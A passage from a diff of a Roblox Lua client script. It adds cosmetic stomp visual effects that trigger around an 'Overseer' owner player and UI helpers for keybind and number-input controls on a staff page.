+            TweenService:Create(bloom, TweenInfo.new(1), {Intensity = 0}):Play()
+        end
+    end)
+    stompEffects.DestroyLater(color, lifetime)
+    stompEffects.DestroyLater(bloom, lifetime)
+    stompEffects.DestroyLater(blur, lifetime)
+end
+
+function stompEffects.PlayTrueDespair(impactPosition)
+    local folder = Instance.new("Folder")
+    folder.Name = "TrueDespairStomp"
+    folder.Parent = Workspace
+
+    stompEffects.ShowScreenBurst(Color3.fromRGB(255, 235, 220), 0.2, 0.22)
+    stompEffects.AddPostEffects(
+        "TrueDespair",
+        Color3.fromRGB(125, 45, 55),
+        -0.38,
+        0.48,
+        18,
+        8
+    )
+
+    stompEffects.CreateDisc(impactPosition, Color3.fromRGB(255, 25, 35), 2, 72, 0.42, 0.1)
+    stompEffects.CreateDisc(impactPosition, Color3.fromRGB(55, 0, 5), 8, 118, 0.78, 0.3)
+
+    local core = stompEffects.CreateOrb(
+        folder,
+        impactPosition + Vector3.new(0, 12, 0),
+        Color3.fromRGB(190, 0, 18),
+        2,
+        0.05
+    )
+    TweenService:Create(
+        core,
+        TweenInfo.new(0.63, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out),
+        {Size = Vector3.new(86, 86, 86), Transparency = 0.72}
+    ):Play()
+
+    local innerCore = stompEffects.CreateOrb(
+        folder,
+        impactPosition + Vector3.new(0, 10, 0),
+        Color3.fromRGB(20, 0, 2),
+        1,
+        0.08
+    )
+    TweenService:Create(
+        innerCore,
+        TweenInfo.new(0.53, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        {Size = Vector3.new(58, 58, 58), Transparency = 0.46}
+    ):Play()
+
+    for index = 1, 38 do
+        local angle = (index / 38) * math.pi * 2 + math.random() * 0.35
+        local reach = math.random(52, 112)
+        local startPosition = impactPosition + Vector3.new(0, math.random(1, 5), 0)
+        local middleOne = impactPosition + Vector3.new(
+            math.cos(angle) * reach * 0.34,
+            math.random(10, 44),
+            math.sin(angle) * reach * 0.34
+        )
+        local middleTwo = impactPosition + Vector3.new(
+            math.cos(angle + math.random(-20, 20) / 100) * reach * 0.7,
+            math.random(24, 78),
+            math.sin(angle + math.random(-20, 20) / 100) * reach * 0.7
+        )
+        local endPosition = impactPosition + Vector3.new(
+            math.cos(angle) * reach,
+            math.random(5, 92),
+            math.sin(angle) * reach
+        )
+
+        task.delay(index * 0.018, function()
+            if not folder.Parent then return end
+            local width = math.random(8, 22) / 10
+            local first = stompEffects.CreateLine(folder, startPosition, middleOne, Color3.fromRGB(255, 0, 28), width, 0.08)
+            local second = stompEffects.CreateLine(folder, middleOne, middleTwo, Color3.fromRGB(175, 0, 20), width * 0.8, 0.12)
+            local third = stompEffects.CreateLine(folder, middleTwo, endPosition, Color3.fromRGB(90, 0, 12), width * 0.55, 0.2)
+            for _, line in ipairs({first, second, third}) do
+                if line then
+                    TweenService:Create(line, TweenInfo.new(5.5), {Transparency = 1}):Play()
+                end
+            end
+        end)
+    end
+
+    for index = 1, 18 do
+        local angle = (index / 18) * math.pi * 2
+        local base = impactPosition + Vector3.new(math.cos(angle) * 24, 0.4, math.sin(angle) * 24)
+        local top = base + Vector3.new(math.random(-8, 8), math.random(48, 98), math.random(-8, 8))
+        local pillar = stompEffects.CreateLine(folder, base, top, Color3.fromRGB(255, 10, 32), 1.05, 0.22)
+        if pillar then
+            TweenService:Create(pillar, TweenInfo.new(4.5), {Transparency = 1}):Play()
+        end
+    end
+
+    for _ = 1, 28 do
+        local angle = math.random() * math.pi * 2
+        local radius = math.random(18, 105)
+        local orb = stompEffects.CreateOrb(
+            folder,
+            impactPosition + Vector3.new(
+                math.cos(angle) * radius,
+                math.random(8, 100),
+                math.sin(angle) * radius
+            ),
+            Color3.fromRGB(255, 0, 35),
+            math.random(4, 14) / 5,
+            0.2
+        )
+        TweenService:Create(orb, TweenInfo.new(5), {
+            Position = orb.Position + Vector3.new(0, math.random(16, 42), 0),
+            Transparency = 1,
+        }):Play()
+    end
+
+    task.delay(0.45, function()
+        stompEffects.ShowScreenBurst(Color3.fromRGB(175, 0, 22), 0.62, 0.65)
+    end)
+    stompEffects.DestroyLater(folder, 7)
+end
+
+function stompEffects.PlayYggdrasil(impactPosition)
+    local folder = Instance.new("Folder")
+    folder.Name = "YggdrasilStomp"
+    folder.Parent = Workspace
+
+    stompEffects.ShowScreenBurst(Color3.fromRGB(210, 255, 225), 0.52, 0.4)
+    stompEffects.AddPostEffects(
+        "Yggdrasil",
+        Color3.fromRGB(125, 255, 185),
+        0.08,
+        0.12,
+        12,
+        8.5
+    )
+
+    stompEffects.CreateDisc(impactPosition, Color3.fromRGB(225, 255, 115), 2, 70, 0.41, 0.03)
+    stompEffects.CreateDisc(impactPosition, Color3.fromRGB(55, 255, 95), 8, 124, 0.73, 0.24)
+
+    for index = 1, 24 do
+        local angle = (index / 24) * math.pi * 2 + math.random() * 0.18
+        local rootEnd = impactPosition + Vector3.new(
+            math.cos(angle) * math.random(48, 102),
+            0.28,
+            math.sin(angle) * math.random(48, 102)
+        )
+        local rootLine = stompEffects.CreateLine(
+            folder,
+            impactPosition + Vector3.new(0, 0.35, 0),
+            rootEnd,
+            index % 2 == 0 and Color3.fromRGB(218, 255, 90) or Color3.fromRGB(25, 255, 105),
+            math.random(8, 20) / 10,
+            0.08
+        )
+        if rootLine then
+            TweenService:Create(rootLine, TweenInfo.new(6.5), {Transparency = 1}):Play()
+        end
+    end
+
+    local crown = impactPosition + Vector3.new(0, 138, 0)
+    local trunk = stompEffects.CreateLine(
+        folder,
+        impactPosition + Vector3.new(0, 0.5, 0),
+        crown,
+        Color3.fromRGB(190, 255, 75),
+        10,
+        0.02
+    )
+    trunk.Size = Vector3.new(0.4, 0.4, trunk.Size.Z)
+    TweenService:Create(
+        trunk,
+        TweenInfo.new(0.33, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out),
+        {Size = Vector3.new(10, 10, trunk.Size.Z)}
+    ):Play()
+
+    local trunkLight = Instance.new("PointLight")
+    trunkLight.Color = Color3.fromRGB(145, 255, 90)
+    trunkLight.Brightness = 12
+    trunkLight.Range = 110
+    trunkLight.Shadows = false
+    trunkLight.Parent = trunk
+
+    for index = 1, 44 do
+        local angle = (index / 44) * math.pi * 2 + math.random() * 0.12
+        local reach = math.random(72, 142)
+        local branchJoint = crown + Vector3.new(
+            math.cos(angle) * reach * 0.34,
+            math.random(-12, 22),
+            math.sin(angle) * reach * 0.34
+        )
+        local branchEnd = crown + Vector3.new(
+            math.cos(angle) * reach,
+            math.random(-42, 48),
+            math.sin(angle) * reach
+        )
+        local branchColor = index % 3 == 0
+            and Color3.fromRGB(240, 255, 120)
+            or Color3.fromRGB(75, 255, 110)
+        local first = stompEffects.CreateLine(folder, crown, branchJoint, branchColor, math.random(11, 27) / 10, 0.02)
+        local second = stompEffects.CreateLine(folder, branchJoint, branchEnd, branchColor, math.random(7, 18) / 10, 0.06)
+        for _, branch in ipairs({first, second}) do
+            if branch then
+                branch.Size = Vector3.new(0.15, 0.15, branch.Size.Z)
+                TweenService:Create(
+                    branch,
+                TweenInfo.new(0.3, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out),
+                    {Size = Vector3.new(index % 2 == 0 and 2.1 or 1.3, index % 2 == 0 and 2.1 or 1.3, branch.Size.Z)}
+                ):Play()
+                TweenService:Create(branch, TweenInfo.new(6.5), {Transparency = 1}):Play()
+            end
+        end
+    end
+
+    for _ = 1, 36 do
+        local angle = math.random() * math.pi * 2
+        local radius = math.random(24, 138)
+        local orb = stompEffects.CreateOrb(
+            folder,
+            impactPosition + Vector3.new(
+                math.cos(angle) * radius,
+                math.random(18, 178),
+                math.sin(angle) * radius
+            ),
+            math.random() > 0.25 and Color3.fromRGB(100, 255, 115) or Color3.fromRGB(245, 255, 155),
+            math.random(5, 18) / 4,
+            0.08
+        )
+        TweenService:Create(orb, TweenInfo.new(6), {
+            Position = orb.Position + Vector3.new(math.random(-12, 12), math.random(24, 58), math.random(-12, 12)),
+            Transparency = 1,
+        }):Play()
+    end
+
+    task.delay(5.15, function()
+        if not folder.Parent then return end
+        local void = stompEffects.CreateOrb(folder, crown, Color3.fromRGB(0, 0, 0), 2, 0)
+        TweenService:Create(
+            void,
+            TweenInfo.new(0.45, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out),
+            {Size = Vector3.new(92, 92, 92)}
+        ):Play()
+        task.delay(0.41, function()
+            if void.Parent then
+                stompEffects.ShowScreenBurst(Color3.fromRGB(245, 255, 120), 0.02, 0.65)
+                TweenService:Create(void, TweenInfo.new(0.2), {Transparency = 1}):Play()
+
+                if trunk.Parent then
+                    TweenService:Create(
+                        trunk,
+                        TweenInfo.new(0.2, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out),
+                        {Size = Vector3.new(28, 28, trunk.Size.Z), Transparency = 0.05}
+                    ):Play()
+                    task.delay(0.18, function()
+                        if trunk.Parent then
+                            TweenService:Create(
+                                trunk,
+                                TweenInfo.new(0.65, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+                                {Size = Vector3.new(92, 92, trunk.Size.Z), Transparency = 1}
+                            ):Play()
+                        end
+                    end)
+                end
+
+                if trunkLight.Parent then
+                    TweenService:Create(
+                        trunkLight,
+                        TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+                        {Brightness = 0, Range = 8}
+                    ):Play()
+                end
+
+                for index = 1, 24 do
+                    local angle = (index / 24) * math.pi * 2
+                    local radius = math.random(95, 165)
+                    local endPosition = crown + Vector3.new(
+                        math.cos(angle) * radius,
+                        math.random(-45, 45),
+                        math.sin(angle) * radius
+                    )
+                    local burstRay = stompEffects.CreateLine(
+                        folder,
+                        crown,
+                        endPosition,
+                        index % 3 == 0
+                            and Color3.fromRGB(255, 255, 150)
+                            or Color3.fromRGB(85, 255, 105),
+                        math.random(8, 18) / 10,
+                        0.02
+                    )
+                    if burstRay then
+                        TweenService:Create(
+                            burstRay,
+                            TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+                            {Transparency = 1}
+                        ):Play()
+                    end
+                end
+            end
+        end)
+    end)
+    task.delay(5.9, function()
+        if trunkLight.Parent then
+            TweenService:Create(trunkLight, TweenInfo.new(1), {Brightness = 0, Range = 5}):Play()
+        end
+    end)
+    stompEffects.DestroyLater(folder, 7.5)
+end
+
+function stompEffects.Play(character, targetPosition, targetCharacter)
+    if not stompEffects.IsEnabled() or not character then return end
+    if os.clock() - stompEffects.LastEffectAt < 6 then return end
+
+    local root = character:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+
+    local raycastParams = RaycastParams.new()
+    raycastParams.FilterType = Enum.RaycastFilterType.Exclude
+    raycastParams.FilterDescendantsInstances = targetCharacter
+        and {character, targetCharacter}
+        or {character}
+    raycastParams.IgnoreWater = true
+    local rayOrigin = (targetPosition or root.Position) + Vector3.new(0, 4, 0)
+    local hit = Workspace:Raycast(rayOrigin, Vector3.new(0, -16, 0), raycastParams)
+    if not hit then return end
+
+    stompEffects.LastEffectAt = os.clock()
+    -- True Despair remains available in the source for a future release, but
+    -- Overseer stomps currently use Yggdrasil exclusively.
+    stompEffects.PlayYggdrasil(hit.Position)
+end
+
+function stompEffects.Trigger(character, generation, delaySeconds, targetPosition, targetCharacter)
+    local triggerGeneration = generation or stompEffects.Generation
+    task.delay(delaySeconds or 0, function()
+        if triggerGeneration == stompEffects.Generation and stompEffects.IsEnabled() then
+            stompEffects.Play(character, targetPosition, targetCharacter)
+        end
+    end)
+end
+
+function stompEffects.IsStompAnimation(track)
+    local animation = track and track.Animation
+    if not animation then return false end
+
+    local animationId = string.match(animation.AnimationId or "", "%d+")
+    if STOMP_ANIMATION_IDS[animationId] then return true end
+
+    local animationName = string.lower(animation.Name or "")
+    return string.find(animationName, "stomp", 1, true) ~= nil
+end
+
+function stompEffects.CancelPending()
+    local pending = stompEffects.PendingStomp
+    stompEffects.PendingStomp = nil
+    if not pending then return end
+    for _, connection in ipairs(pending.Connections or {}) do
+        pcall(function()
+            connection:Disconnect()
+        end)
+    end
+end
+
+function stompEffects.FindKnockedTarget(character)
+    local root = character and character:FindFirstChild("HumanoidRootPart")
+    if not root then return nil end
+
+    local bestTarget
+    local bestDistance = 24
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Character and player.Character ~= character then
+            local targetCharacter = player.Character
+            local targetRoot = targetCharacter:FindFirstChild("HumanoidRootPart")
+            local targetHumanoid = targetCharacter:FindFirstChildOfClass("Humanoid")
+            if targetRoot and targetHumanoid and targetHumanoid.Health > 0 then
+                local distance = (targetRoot.Position - root.Position).Magnitude
+                if distance < bestDistance then
+                    bestDistance = distance
+                    bestTarget = {
+                        Character = targetCharacter,
+                        Humanoid = targetHumanoid,
+                        Root = targetRoot,
+                    }
+                end
+            end
+        end
+    end
+    return bestTarget
+end
+
+function stompEffects.FinishPending(pending)
+    if stompEffects.PendingStomp ~= pending
+        or not pending.Confirmed
+        or pending.Generation ~= stompEffects.Generation then
+        return
+    end
+
+    local targetPosition = pending.LastTargetPosition
+    if pending.TargetRoot and pending.TargetRoot.Parent then
+        targetPosition = pending.TargetRoot.Position
+    end
+    stompEffects.CancelPending()
+    stompEffects.Trigger(
+        pending.Character,
+        pending.Generation,
+        0.06,
+        targetPosition,
+        pending.TargetCharacter
+    )
+end
+
+function stompEffects.Arm(character, generation, track)
+    if generation ~= stompEffects.Generation or not stompEffects.IsEnabled() then return end
+    local target = stompEffects.FindKnockedTarget(character)
+    if not target then
+        stompEffects.CancelPending()
+        return
+    end
+
+    local existing = stompEffects.PendingStomp
+    if existing and existing.TargetHumanoid == target.Humanoid then
+        if existing.Track or not track then
+            return
+        end
+    end
+
+    stompEffects.CancelPending()
+    local pending = {
+        Character = character,
+        Generation = generation,
+        TargetCharacter = target.Character,
+        TargetHumanoid = target.Humanoid,
+        TargetRoot = target.Root,
+        LastTargetPosition = target.Root.Position,
+        Track = track,
+        Confirmed = false,
+        AnimationFinished = false,
+        Connections = {},
+    }
+    stompEffects.PendingStomp = pending
+
+    function stompEffects.ConfirmPendingDeath(currentPending)
+        if stompEffects.PendingStomp ~= currentPending then return end
+        currentPending.Confirmed = true
+        if currentPending.Track then
+            if currentPending.AnimationFinished or not currentPending.Track.IsPlaying then
+                stompEffects.FinishPending(currentPending)
+            end
+        else
+            task.delay(0.4, function()
+                if stompEffects.PendingStomp == currentPending then
+                    currentPending.AnimationFinished = true
+                    stompEffects.FinishPending(currentPending)
+                end
+            end)
+        end
+    end
+
+    table.insert(pending.Connections, target.Humanoid.HealthChanged:Connect(function(health)
+        if stompEffects.PendingStomp ~= pending then return end
+        if pending.TargetRoot and pending.TargetRoot.Parent then
+            pending.LastTargetPosition = pending.TargetRoot.Position
+        end
+        if health <= 0 then
+            stompEffects.ConfirmPendingDeath(pending)
+        end
+    end))
+
+    table.insert(pending.Connections, target.Humanoid.Died:Connect(function()
+        stompEffects.ConfirmPendingDeath(pending)
+    end))
+
+    if track then
+        table.insert(pending.Connections, track.Stopped:Connect(function()
+            if stompEffects.PendingStomp ~= pending then return end
+            pending.AnimationFinished = true
+            if pending.Confirmed or pending.TargetHumanoid.Health <= 0 then
+                pending.Confirmed = true
+                stompEffects.FinishPending(pending)
+            end
+        end))
+    end
+
+    task.delay(3.5, function()
+        if stompEffects.PendingStomp == pending then
+            if pending.TargetHumanoid.Parent and pending.TargetHumanoid.Health <= 0 then
+                pending.Confirmed = true
+                stompEffects.FinishPending(pending)
+            else
+                stompEffects.CancelPending()
+            end
+        end
+    end)
+end
+
+function stompEffects.BindStateValue(value, character, generation)
+    local valueName = string.lower(value.Name or "")
+    if not STOMP_STATE_NAMES[valueName] then return end
+
+    local connection = value.Changed:Connect(function(newValue)
+        if newValue == true or newValue == "true" or newValue == 1 then
+            stompEffects.Arm(character, generation, nil)
+        end
+    end)
+    table.insert(stompEffects.Connections, connection)
+end
+
+function stompEffects.BindStompTool(tool, character, generation)
+    if not tool:IsA("Tool") then return end
+    if not string.find(string.lower(tool.Name), "stomp", 1, true) then return end
+
+    local connection = tool.Activated:Connect(function()
+        stompEffects.Arm(character, generation, nil)
+    end)
+    table.insert(stompEffects.Connections, connection)
+end
+
+function stompEffects.WatchVictimCharacter(victimCharacter, ownerCharacter, generation)
+    if not victimCharacter or victimCharacter == ownerCharacter then return end
+
+    task.spawn(function()
+        local victimHumanoid = victimCharacter:FindFirstChildOfClass("Humanoid")
+            or victimCharacter:WaitForChild("Humanoid", 8)
+        local victimRoot = victimCharacter:FindFirstChild("HumanoidRootPart")
+            or victimCharacter:WaitForChild("HumanoidRootPart", 8)
+        if generation ~= stompEffects.Generation
+            or not stompEffects.IsEnabled()
+            or not victimHumanoid
+            or not victimRoot then
+            return
+        end
+
+        local wasAlive = victimHumanoid.Health > 0
+        local fired = false
+        local function confirmNearbyOverseerDeath()
+            if fired
+                or not wasAlive
+                or generation ~= stompEffects.Generation
+                or victimHumanoid.Health > 0 then
+                return
+            end
+
+            local ownerRoot = ownerCharacter
+                and ownerCharacter:FindFirstChild("HumanoidRootPart")
+            if not ownerRoot or not victimRoot.Parent then return end
+            if (ownerRoot.Position - victimRoot.Position).Magnitude > 30 then return end
+
+            fired = true
+            local targetPosition = victimRoot.Position
+            task.delay(0.55, function()
+                if generation == stompEffects.Generation
+                    and stompEffects.IsEnabled()
+                    and ownerCharacter.Parent then
+                    stompEffects.Trigger(
+                        ownerCharacter,
+                        generation,
+                        0,
+                        targetPosition,
+                        victimCharacter
+                    )
+                end
+            end)
+        end
+
+        local healthConnection = victimHumanoid.HealthChanged:Connect(function(health)
+            if health > 0 then
+                wasAlive = true
+                fired = false
+                return
+            end
+            confirmNearbyOverseerDeath()
+        end)
+        local diedConnection = victimHumanoid.Died:Connect(confirmNearbyOverseerDeath)
+        table.insert(stompEffects.Connections, healthConnection)
+        table.insert(stompEffects.Connections, diedConnection)
+    end)
+end
+
+function stompEffects.WatchVictimPlayer(player, ownerCharacter, generation)
+    if not player or isOwner(player) then return end
+    if player.Character then
+        stompEffects.WatchVictimCharacter(player.Character, ownerCharacter, generation)
+    end
+    local connection = player.CharacterAdded:Connect(function(character)
+        stompEffects.WatchVictimCharacter(character, ownerCharacter, generation)
+    end)
+    table.insert(stompEffects.Connections, connection)
+end
+
+function stompEffects.WatchAllVictims(ownerCharacter, generation)
+    for _, player in ipairs(Players:GetPlayers()) do
+        stompEffects.WatchVictimPlayer(player, ownerCharacter, generation)
+    end
+end
+
+function stompEffects.Attach(character, sourcePlayer)
+    stompEffects.Generation += 1
+    local generation = stompEffects.Generation
+    stompEffects.ClearConnections()
+    if not stompEffects.IsEnabled()
+        or not character
+        or not sourcePlayer
+        or not isOwner(sourcePlayer) then
+        return
+    end
+
+    task.spawn(function()
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+            or character:WaitForChild("Humanoid", 10)
+        if generation ~= stompEffects.Generation
+            or not stompEffects.IsEnabled()
+            or not humanoid then
+            return
+        end
+
+        if sourcePlayer == localPlayer then
+            stompEffects.InputConnection = UserInputService.InputBegan:Connect(function(input)
+                if input.UserInputType ~= Enum.UserInputType.Keyboard
+                    or input.KeyCode ~= Enum.KeyCode.E
+                    or isPlayerTyping() then
+                    return
+                end
+                stompEffects.Arm(character, generation, nil)
+            end)
+        end
+
+        local animationConnection = humanoid.AnimationPlayed:Connect(function(track)
+            if stompEffects.IsStompAnimation(track) then
+                stompEffects.Arm(character, generation, track)
+            end
+        end)
+        table.insert(stompEffects.Connections, animationConnection)
+
+        for _, descendant in ipairs(character:GetDescendants()) do
+            if descendant:IsA("BoolValue")
+                or descendant:IsA("StringValue")
+                or descendant:IsA("IntValue")
+                or descendant:IsA("NumberValue") then
+                stompEffects.BindStateValue(descendant, character, generation)
+            end
+        end
+
+        for _, child in ipairs(character:GetChildren()) do
+            stompEffects.BindStompTool(child, character, generation)
+        end
+
+        local descendantConnection = character.DescendantAdded:Connect(function(descendant)
+            if descendant:IsA("BoolValue")
+                or descendant:IsA("StringValue")
+                or descendant:IsA("IntValue")
+                or descendant:IsA("NumberValue") then
+                stompEffects.BindStateValue(descendant, character, generation)
+            end
+            stompEffects.BindStompTool(descendant, character, generation)
+        end)
+        table.insert(stompEffects.Connections, descendantConnection)
+
+        for _, attributeName in ipairs({
+            "Stomp",
+            "Stomping",
+            "StompActive",
+            "StompStarted",
+        }) do
+            local attributeConnection = character:GetAttributeChangedSignal(attributeName):Connect(function()
+                local value = character:GetAttribute(attributeName)
+                if value == true or value == "true" or value == 1 then
+                    stompEffects.Arm(character, generation, nil)
+                end
+            end)
+            table.insert(stompEffects.Connections, attributeConnection)
+        end
+
+        stompEffects.WatchAllVictims(character, generation)
+    end)
+end
+
+function stompEffects.FindOverseer()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if isOwner(player) then
+            return player
+        end
+    end
+    return nil
+end
+
+function stompEffects.BindOverseer(player)
+    if stompEffects.CharacterConnection then
+        stompEffects.CharacterConnection:Disconnect()
+        stompEffects.CharacterConnection = nil
+    end
+    stompEffects.SourcePlayer = player
+    stompEffects.ClearConnections()
+    if not player or not stompEffects.IsEnabled() then return end
+
+    stompEffects.CharacterConnection = player.CharacterAdded:Connect(function(character)
+        stompEffects.Attach(character, player)
+    end)
+    if player.Character then
+        stompEffects.Attach(player.Character, player)
+    end
+end
+
+function stompEffects.RefreshOverseer()
+    stompEffects.BindOverseer(stompEffects.FindOverseer())
+end
+
+stompEffects.PlayerAddedConnection = Players.PlayerAdded:Connect(function(player)
+    if isOwner(player) then
+        stompEffects.BindOverseer(player)
+    elseif stompEffects.SourcePlayer
+        and stompEffects.SourcePlayer.Character
+        and stompEffects.IsEnabled() then
+        stompEffects.WatchVictimPlayer(
+            player,
+            stompEffects.SourcePlayer.Character,
+            stompEffects.Generation
+        )
+    end
+end)
+stompEffects.PlayerRemovingConnection = Players.PlayerRemoving:Connect(function(player)
+    if player == stompEffects.SourcePlayer then
+        stompEffects.BindOverseer(nil)
+    end
+end)
+stompEffects.RefreshOverseer()
+
+local function createSectionHeader(parent, text, yPos, color)
+    color = color or theme.AccentSecondary
+    local holder = Instance.new("Frame", parent)
+    holder.BackgroundTransparency = 1
+    holder.Position = UDim2.new(0, 0, 0, yPos)
+    holder.Size = UDim2.new(1, 0, 0, 24)
+
+    local label = Instance.new("TextLabel", holder)
+    label.BackgroundTransparency = 1
+    label.Size = UDim2.new(0, 170, 1, 0)
+    label.Font = Enum.Font.GothamBold
+    label.Text = text
+    label.TextColor3 = color
+    label.TextSize = 12
+    label.TextXAlignment = Enum.TextXAlignment.Left
+
+    local line = Instance.new("Frame", holder)
+    line.BackgroundColor3 = color
+    line.BackgroundTransparency = 0.55
+    line.BorderSizePixel = 0
+    line.Position = UDim2.new(0, 176, 0.5, 0)
+    line.Size = UDim2.new(1, -176, 0, 1)
+    local dot = Instance.new("Frame", holder)
+    dot.BackgroundColor3 = color
+    dot.BorderSizePixel = 0
+    dot.Position = UDim2.new(0, 165, 0.5, -3)
+    dot.Size = UDim2.new(0, 6, 0, 6)
+    Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)
+    return holder
+end
+
+local function createKeybindControl(name, desc, yPos, initialKey, callback, parent, validateKey, accentOverride)
+    local keyAccent = accentOverride or (yPos % 2 == 0 and theme.AccentPrimary or theme.AccentPink)
+    local f = Instance.new("Frame", parent or staffPage)
+    f.BackgroundColor3 = theme.BackgroundSecondary
+    f.ClipsDescendants = true
+    f.Position = UDim2.new(0, 0, 0, yPos)
+    f.Size = UDim2.new(1, 0, 0, 55)
+    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 12)
+    addGradient(f, theme.BackgroundSecondary, theme.BackgroundTertiary, 0)
+    local s = Instance.new("UIStroke", f)
+    s.Color = keyAccent
+    s.Thickness = 2
+    s.Transparency = initialKey and 0.2 or 0.8
+    local accentBar = Instance.new("Frame", f)
+    accentBar.BackgroundColor3 = keyAccent
+    accentBar.BackgroundTransparency = initialKey and 0 or 0.55
+    accentBar.BorderSizePixel = 0
+    accentBar.Position = UDim2.new(0, 0, 0, 9)
+    accentBar.Size = UDim2.new(0, 3, 1, -18)
+    Instance.new("UICorner", accentBar).CornerRadius = UDim.new(1, 0)
+
+    local tl = Instance.new("TextLabel", f)
+    tl.BackgroundTransparency = 1
+    tl.Position = UDim2.new(0, 14, 0, 8)
+    tl.Size = UDim2.new(1, -116, 0, 18)
+    tl.Font = Enum.Font.GothamBold
+    tl.Text = name
+    tl.TextTruncate = Enum.TextTruncate.AtEnd
+    tl.TextColor3 = theme.TextPrimary
+    tl.TextSize = 13
+    tl.TextXAlignment = Enum.TextXAlignment.Left
+
+    local dl = Instance.new("TextLabel", f)
+    dl.BackgroundTransparency = 1
+    dl.Position = UDim2.new(0, 14, 0, 28)
+    dl.Size = UDim2.new(1, -116, 0, 20)
+    dl.Font = Enum.Font.Gotham
+    dl.Text = desc
+    dl.TextTruncate = Enum.TextTruncate.AtEnd
+    dl.TextColor3 = theme.TextSecondary
+    dl.TextSize = 11
+    dl.TextXAlignment = Enum.TextXAlignment.Left
+
+    local keyButton = Instance.new("TextButton", f)
+    keyButton.BackgroundColor3 = initialKey and keyAccent or Color3.fromRGB(70, 59, 96)
+    keyButton.Position = UDim2.new(1, -96, 0.5, -15)
+    keyButton.Size = UDim2.new(0, 82, 0, 30)
+    keyButton.Font = Enum.Font.GothamBold
+    keyButton.Text = initialKey and initialKey.Name or "UNBOUND"
+    keyButton.TextColor3 = theme.TextPrimary
+    keyButton.TextSize = 10
+    keyButton.AutoButtonColor = false
+    Instance.new("UICorner", keyButton).CornerRadius = UDim.new(0, 8)
+
+    local listening = false
+    local previousText = keyButton.Text
+    local function unbind()
+        if not listening then return end
+        listening = false
+        state.KeybindCapture = false
+        if state.CancelKeybindCapture then state.CancelKeybindCapture = nil end
+        initialKey = nil
+        keyButton.Text = "UNBOUND"
+        keyButton.BackgroundColor3 = theme.BackgroundTertiary
+        tween(s, {Transparency = 0.8}, 0.2)
+        callback(nil)
+    end
+
+    keyButton.MouseButton1Click:Connect(function()
+        if listening then
+            unbind()
+            return
+        end
+        if state.CancelKeybindCapture then state.CancelKeybindCapture() end
+        listening = true
+        state.KeybindCapture = true
+        state.CancelKeybindCapture = unbind
+        previousText = keyButton.Text
+        keyButton.Text = "PRESS KEY"
+        keyButton.BackgroundColor3 = theme.AccentSecondary
+    end)
+
+    UserInputService.InputBegan:Connect(function(input)
+        if not listening or input.UserInputType ~= Enum.UserInputType.Keyboard then return end
+
+        if input.KeyCode == Enum.KeyCode.Escape then
+            listening = false
+            state.KeybindCapture = false
+            if state.CancelKeybindCapture == unbind then state.CancelKeybindCapture = nil end
+            keyButton.Text = previousText
+            keyButton.BackgroundColor3 = initialKey and theme.AccentPrimary or theme.BackgroundTertiary
+            return
+        end
+
+        if input.KeyCode == Enum.KeyCode.Backspace or input.KeyCode == Enum.KeyCode.Delete then
+            unbind()
+            return
+        end
+
+        if input.KeyCode == Enum.KeyCode.Unknown then return end
+        if validateKey then
+            local allowed, reason = validateKey(input.KeyCode)
+            if allowed == false then
+                keyButton.Text = "KEY IN USE"
+                notify("KEYBIND", reason or "That key is already assigned", 3, "warning")
+                task.delay(0.8, function()
+                    if listening and keyButton.Parent then
+                        keyButton.Text = "PRESS A KEY"
+                    end
+                end)
+                return
+            end
+        end
+        listening = false
+        state.KeybindCapture = false
+        if state.CancelKeybindCapture == unbind then state.CancelKeybindCapture = nil end
+        initialKey = input.KeyCode
+        keyButton.Text = input.KeyCode.Name
+        keyButton.BackgroundColor3 = theme.AccentPrimary
+        tween(s, {Transparency = 0.2}, 0.2)
+        callback(input.KeyCode)
+    end)
+    return unbind
+end
+
+-- Any left click outside the active key button cancels capture and unbinds it.
+-- The defer lets the button's own MouseButton1Click handler run first.
+UserInputService.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+        and state.KeybindCapture
+        and state.CancelKeybindCapture then
+        task.defer(function()
+            if state.KeybindCapture and state.CancelKeybindCapture then
+                state.CancelKeybindCapture()
+            end
+        end)
+    end
+end)
+
+local function createNumberInput(name, desc, yPos, initialValue, minValue, maxValue, callback, parent)
+    local f = Instance.new("Frame", parent or staffPage)
+    f.BackgroundColor3 = theme.BackgroundSecondary
+    f.Position = UDim2.new(0, 0, 0, yPos)
+    f.Size = UDim2.new(1, 0, 0, 55)
+    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 12)
+    local s = Instance.new("UIStroke", f)
+    s.Color = theme.AccentSecondary
+    s.Thickness = 2
+    s.Transparency = 0.2
+
+    local tl = Instance.new("TextLabel", f)
+    tl.BackgroundTransparency = 1
+    tl.Position = UDim2.new(0, 14, 0, 8)
+    tl.Size = UDim2.new(1, -116, 0, 18)
+    tl.Font = Enum.Font.GothamBold
+    tl.Text = name
+    tl.TextColor3 = theme.TextPrimary
+    tl.TextSize = 13
+    tl.TextXAlignment = Enum.TextXAlignment.Left
+
+    local dl = Instance.new("TextLabel", f)
+    dl.BackgroundTransparency = 1
+    dl.Position = UDim2.new(0, 14, 0, 28)
+    dl.Size = UDim2.new(1, -116, 0, 20)
+    dl.Font = Enum.Font.Gotham
+    dl.Text = desc
+    dl.TextColor3 = theme.TextSecondary
+    dl.TextSize = 11
+    dl.TextXAlignment = Enum.TextXAlignment.Left
+
+    local box = Instance.new("TextBox", f)
+    box.BackgroundColor3 = theme.BackgroundTertiary
+    box.Position = UDim2.new(1, -96, 0.5, -15)
+    box.Size = UDim2.new(0, 82, 0, 30)
+    box.Font = Enum.Font.GothamBold
+    box.Text = tostring(initialValue)
+    box.TextColor3 = theme.TextPrimary
+    box.TextSize = 11
+    box.ClearTextOnFocus = false
